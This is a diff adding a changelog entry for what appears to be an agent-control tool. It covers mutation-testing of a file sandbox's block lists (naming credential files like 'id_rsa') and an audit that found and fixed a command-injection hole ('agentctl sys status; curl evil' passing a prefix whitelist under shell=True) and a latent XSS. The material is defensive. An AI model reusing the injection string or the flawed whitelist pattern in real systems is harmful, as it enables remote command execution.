@@ -1,3 +1,117 @@
+## v4.169.33 — 2026-08-10
+
+### Mutation debt in the file sandbox: 89 survivors -> 0
+
+`arena/files/sandbox.py` gate target, measured with mutmut: 216 mutants,
+19 fixed-family kills later it was 127 killed / 89 survived. The
+survivors were not 89 bugs -- they were 89 unproven protections. Sorted
+by hand into four classes, each one named the test that was never
+written:
+
+* **Blocklist-entry removal (~45).** mutmut rewrites one literal of a
+  refusal set (`"id_rsa"` -> `"XXid_rsaXX"`) and that set quietly loses
+  one member. Existing tests exercised *some* entries, never *all* of
+  them -- `XXautonomyXX` survived, i.e. nothing proved the agent cannot
+  read or edit the operator posture dir. The wrong fix is to parametrize
+  a test over the live module constant (the mutant removes the entry
+  from what the test iterates, too; the mutant survives again). The new
+  parity suite keeps its own committed copy of each of the four sets,
+  asserts set equality with the module, and then behaviourally refuses
+  **every** entry in the test-side copy through **all five** validators
+  (upload/download/edit/view/create). Adding a protection without the
+  parity row now fails red on purpose.
+* **Status-code drift (10).** 400->401 on a missing path, 403->404 on
+  outside-home, 404->405 on file-not-found, 409->410 on already-exists,
+  200->201 on success. The "sensitivity before existence" ordering only
+  keeps the 403-vs-404 oracle honest if the codes arrive unchanged, so
+  the statuses are now pinned exactly.
+* **Sentinel-message drift (~19).** The short strings here are
+  load-bearing tokens: `validate_upload_target` literally compares
+  `err == "path outside home directory"` to decide the rewording branch,
+  and `"file not found"` is a protocol value mirrored by two other
+  modules. Their exact spelling is pinned, along with the
+  upload/create rewording and the `{action}` verb threading
+  (`action="XXuploadingXX"` mutants die on the message contract).
+* **Equivalent sliding-window mutants (4).**
+  `range(len(parts) - len(want) + 1)'s` `+` variants cannot change
+  behaviour (an over-long slice never compares equal), while the `-`
+  variants were already killed. Both loops are rewritten
+  constant-free via `_contains_part_seq`, so the equivalent family
+  stops being generated at all; what remains must be killed, and is.
+
+One inversion worth singling out: `if ".." in Path(target).parts` ->
+`"XX..XX"` survived because a traversal like `~/x/../../etc` is caught
+*again* by the resolve-and-compare check two lines below. The parity
+suite refuses `a/../b`, which resolves **inside** home, so only the
+literal check can refuse it -- that mutant now dies twice over.
+
+Result: **208 killed / 0 survived**. `scripts/mutation_baseline.json`
+for this file is `0`; the ratchet blocks any regression from there.
+`tests/test_files_sandbox_parity_v4_169_33.py`, 410 parametrized cases.
+
+### Dismissed-alert audit: 85 high/critical, 83 held up, 2 were real
+
+Ivan's question from the v4.169.30 cycle was fair, so this release
+re-examined all 294 dismissed alerts by pulling the full record from
+the code-scanning API and re-checking every high/critical/error entry
+against the tree -- not by trusting the dismissal comments.
+
+Held up under re-verification (83): the Scorecard meta checks are
+policy decisions (single maintainer; CI is the review). All eight
+TokenPermissions entries match the tree (top-level `permissions: {}` +
+job-scoped write, re-read in this session). The path-injection
+"won't fix" set in `exec/handlers.py` is guarded by `under_root` +
+root-scoped mkstemp; `resources/handlers.py` and
+`profiles/load_handler.py` filter through strict character-class
+sanitizers; `standalone_tools.py`'s old alert rows predate the
+`_jail()` that now covers them. DevSkim's `check_hostname = False` in
+`agentctl_cli/tls.py` is quoted history inside a docstring; the live
+code paths behind it are opt-in with a loud warning. The reflective-XSS
+claim of "escaped in template" is true (`_html_mod.escape(url_token)`).
+
+Two did not hold up:
+
+* **Web gateway decorative whitelist + fail-open auth (two bugs, one
+  RCE shape).** `bin/web_gateway.py` answered "no token configured =>
+  open (dev mode)" on an endpoint that runs shell commands, and its
+  command whitelist was a bare `startswith`: `agentctl sys status;
+  curl evil` passed the check and `shell=True` executed the whole
+  string. That is bug #65's class, fixed for `/v1/exec` in v4.165.0
+  and never carried over here. Fixed at the root: auth fails closed
+  (misconfigured => 503, not open), whitelisted commands reject shell
+  control characters using the SAME constant the exec policy uses
+  (shared via a public alias so two copies cannot drift), and the MCP
+  proxy finally forwards the bearer token -- every `/tool` call had
+  been coming back 401 and nobody noticed because the hop had no test.
+  `tests/test_web_gateway_v4_169_33.py` proves it over real HTTP:
+  metachar command -> 403 and a canary file never created, no token ->
+  503, honest prefix -> exits through the shell.
+* **Dashboard error meta, latent XSS (token-theft chain).** The
+  refresh-meta toolbar exists in four copies. Two escaped the
+  `last error:` fragment going into `innerHTML`; two
+  (`04d-overview-toolbar.js`, `08b-missions-toolbar.js`) did not. The
+  fragment carries `String(e.message)`, and the API helper builds that
+  message from the server's error body -- so any endpoint whose error
+  reflects caller input would hand markup to the browser that holds the
+  bridge bearer token. No current tab loader throws such a string, so
+  this was a loaded-but-unfired gun; the copy drift is exactly the kind
+  of place the next edit fires it. Both files now escape, and both
+  CodeQL dismissals (#2/#3, "trusted internal data") were wrong in
+  their reasoning even though nothing was exploitable yet. A source
+  ratchet pairs each `last error:` fragment with the array that feeds
+  `innerHTML` (a `.title` tooltip in `04c-net-breaker.js` correctly
+  stays silent), and a Node harness rejects the wrapped loader with a
+  markup payload and asserts the rendered meta contains the escaped
+  text and no live tag. Sabotage caught by all three layers.
+
+### Notes
+
+* mutmut 2.5.1 has no `pragma: no mutate`; verified in source before
+  choosing the loop rewrite over marker comments.
+* The `.title` tooltip in `04c-net-breaker.js` is a false positive of a
+  naive grep and the reason the ratchet pairs fragment with sink.
+
+
 ## v4.169.32 — 2026-08-10
 
 ### A type checker installed by every job and run by none
